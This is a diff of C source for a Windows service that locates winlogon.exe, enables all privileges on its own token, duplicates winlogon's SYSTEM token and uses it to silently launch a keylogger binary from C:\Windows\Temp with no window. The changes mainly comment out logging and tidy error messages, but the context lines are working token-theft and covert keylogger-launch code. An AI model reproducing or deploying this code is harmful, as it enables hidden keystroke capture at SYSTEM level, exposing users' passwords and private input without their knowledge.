@@ -120,7 +120,6 @@ DWORD GetPIDByProcName(char *name)
 {
     HANDLE handleProc = NULL;
     PROCESSENTRY32 pe32;
-    log("Inside GetPIDByProcName");
     handleProc = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (handleProc == INVALID_HANDLE_VALUE)
         exit(PrintError());
@@ -132,11 +131,11 @@ DWORD GetPIDByProcName(char *name)
     }
     if (!strcmp(pe32.szExeFile, name))
     {
-        log("====");
-        log("Found the following binary :");
-        log(name);
-        log("====");
-        printf("Found %s with PID %lu\n", name,  pe32.th32ProcessID);
+        // log("====");
+        // log("Found the following binary :");
+        // log(name);
+        // log("====");
+        // printf("Found %s with PID %lu\n", name,  pe32.th32ProcessID);
         CloseHandle(handleProc);
         return  pe32.th32ProcessID;
     }
@@ -144,20 +143,20 @@ DWORD GetPIDByProcName(char *name)
     {
         if (!strcmp(pe32.szExeFile, name))
         {
-            log("====");
-            log("Found the following binary :");
-            log(name);
-            log("====");
-            printf("Found %s with PID %lu\n", name, pe32.th32ProcessID);
+            // log("====");
+            // log("Found the following binary :");
+            // log(name);
+            // log("====");
+            // printf("Found %s with PID %lu\n", name, pe32.th32ProcessID);
             CloseHandle(handleProc);
             return pe32.th32ProcessID;
         }
     }
     CloseHandle(handleProc);
-    log("====");
-    log("Impossible to find the following process PID\n");
-    log(name);
-    log("====");
+    // log("====");
+    // log("Impossible to find the PID of the following process:");
+    // log(name);
+    // log("====");
     return 1;
 }
 
@@ -172,7 +171,7 @@ BOOL EnableAllPrivilege(HANDLE currentToken)
     GetTokenInformation(currentToken, TokenPrivileges, &tp, sizeof(TOKEN_PRIVILEGES), &returnLength);
     PTOKEN_PRIVILEGES pPrivileges = malloc((size_t)returnLength);
     if (pPrivileges == NULL) {
-        log("malloc failed.\n");
+        log("malloc failed.");
         exit(1);
     }
     GetTokenInformation(currentToken, TokenPrivileges, pPrivileges, returnLength, &returnLength);
@@ -180,7 +179,7 @@ BOOL EnableAllPrivilege(HANDLE currentToken)
         pPrivileges->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED;
     if (!AdjustTokenPrivileges(currentToken, FALSE, pPrivileges, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
     {
-        log("AdjustTokenPrivileges failed.\n");
+        log("AdjustTokenPrivileges failed.");
         exit(PrintError());
     }
     return TRUE;
@@ -192,12 +191,16 @@ VOID ImpersonateSystemTokenAndLaunchKeylogger(LPPROCESS_INFORMATION keylogInfo, 
     HANDLE procHandle = NULL;
     HANDLE newSysTok = NULL;
     HANDLE currentToken = NULL;
-    char *winlogon = "winlogon.exe";
     DWORD winlogonPID = 1;
 
+    if (PathFileExistsA((LPCSTR)KEYLOG_BIN_PATH) == FALSE)
+    {
+        log("winkey.exe do not exist inside C:\\Windows\\Temp.");
+        exit(PrintError());
+    }
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &currentToken))
     {
-        log("OpenProcessToken failed.\n");
+        log("OpenProcessToken failed.");
         exit(PrintError());
     }
     //put granted privileges to enabled
@@ -206,24 +209,24 @@ VOID ImpersonateSystemTokenAndLaunchKeylogger(LPPROCESS_INFORMATION keylogInfo, 
     // PrintUserNameByProc();
 
     // PrintPrivileges(GetCurrentProcessToken());
-    winlogonPID = GetPIDByProcName(winlogon);
+    winlogonPID = GetPIDByProcName(WINLOGON_NAME);
     if (winlogonPID == 1) exit(ERROR);//1 can not be a PID on windows
     procHandle = OpenProcess(MAXIMUM_ALLOWED, TRUE, winlogonPID);
     if (procHandle == NULL)
     {
-        log("Impossible to get the process handle.\n");
+        log("Impossible to get the process handle.");
         exit(PrintError());
     }
     BOOL success = OpenProcessToken(procHandle, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_SESSIONID, &sysToken);
     if (!success)
     {
-        log("Could not open the process token.\n");
+        log("Could not open the process token.");
         exit(PrintError());
     }
     success = DuplicateTokenEx(sysToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,  TokenPrimary, &newSysTok);
     if (!success)
     {
-        log("Could not duplicate the process token.\n");
+        log("Could not duplicate the process token.");
         exit(PrintError());
     }
     STARTUPINFO sa = {0};
@@ -231,14 +234,14 @@ VOID ImpersonateSystemTokenAndLaunchKeylogger(LPPROCESS_INFORMATION keylogInfo, 
     success = SetTokenInformation(newSysTok, TokenSessionId, &sessionsID, sizeof(sessionsID));
     if (success == FALSE)
     {
-        log("\nSetTokenInformation failed.\n");
+        log("SetTokenInformation failed.");
         PrintError();
     }
     success =  CreateProcessAsUserA(newSysTok, KEYLOG_BIN_PATH, NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW, NULL, NULL, &sa, keylogInfo);
     if (success == FALSE)
     {
         PrintError();
-        log("CreateProcessAsUserA failed.\n");
+        log("CreateProcessAsUserA failed.");
         ReportSvcStatus(SERVICE_STOPPED, GetLastError(), 0);
         exit(1);
     }
